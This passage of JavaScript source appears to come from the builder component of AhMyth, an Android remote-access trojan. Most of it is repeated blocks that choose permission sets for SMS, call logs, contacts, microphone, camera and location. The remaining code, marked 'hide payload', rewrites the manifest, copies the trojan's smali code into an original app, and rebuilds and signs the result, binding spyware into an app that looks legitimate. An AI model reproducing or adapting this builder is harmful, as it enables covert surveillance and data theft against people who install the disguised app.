            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }



          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
                //hide payload by editing AndroidManifest.xml
            fs.readFile(path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), 'utf8', (err,data) => {
                var defaultper = `    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.BACKGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>`
                var formatted2 = data.replace(defaultper, Permissionsrules);
            fs.writeFile(path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), formatted2, 'utf8', (err) => {
                if (err) {
                    $appCtrl.Log('Hiding in AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
                    return;
                }
                })
        })
        $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
        $appCtrl.Log();
        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
            (error, stdout, stderr) => {
                if (error !== null) {
                    $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
                    fs.writeFile(path.join(logPath, 'Building.log'), `Copy and past this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                    $appCtrl.Log('Building Error written to "Building.log" on...', CONSTANTS.logStatus.INFO)
                    $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;                 
                }

                $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
                $appCtrl.Log();
                var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
                    (error, stdout, stderr) => {
                        if (error !== null) {
                            $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
                            fs.writeFile(path.join(logPath, 'Signing.log'), `Copy and past this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                            $appCtrl.Log('Signing Error written to Signing.log on ', path.join(dataPath, logPath), CONSTANTS.logStatus.INFO);
                            $appCtrl.Log();
                            return;
                        }


                        fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
                            if (err) throw err;
                              
                            $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
                            $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);   
                            $appCtrl.Log();                     
                            
                            fs.copyFile(path.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                              if (err) throw err;

                            });
                          });
                    });
            });

    }

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

        $appCtrl.Log("Copying Ahmyth files to orginal app...");
        $appCtrl.Log();
        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali"), (error) => {
            if (error) {
                $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log();
                return;
            }

            $appCtrl.GenerateApk(apkFolder);
        })

    };


    // function to copy all the ahmyth permissions to the orginal app
    $appCtrl.copyPermissions = (manifest) => {
        var firstPart = manifest.substring(0, manifest.indexOf("<application"));
        var lastPart = manifest.substring(manifest.indexOf("<application"));
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6"); 
        var checkBoxofCallsLogs = document.getElementById("Permissions7");
        //if all unchecked
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = CONSTANTS.permissions
        }
        //if all checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = CONSTANTS.permissions
        }
        //if only one selected
